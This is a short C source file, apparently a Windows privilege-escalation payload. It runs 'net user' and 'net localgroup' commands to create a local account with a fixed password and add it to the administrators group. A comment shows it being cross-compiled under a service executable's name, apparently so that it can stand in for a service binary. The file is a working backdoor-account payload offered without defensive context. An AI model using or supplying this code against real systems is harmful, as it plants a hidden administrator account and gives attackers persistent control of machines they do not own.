#include <stdlib.h>

//Compiling: x86_64-w64-mingw32-gcc adduser.c -o <SERVICE>.exe

int main ()
{
  int i;
  
  i = system ("net user sr4nd3rs0n password123! /add");
  i = system ("net localgroup administrators sr4nd3rs0n /add");
  
  return 0;
}
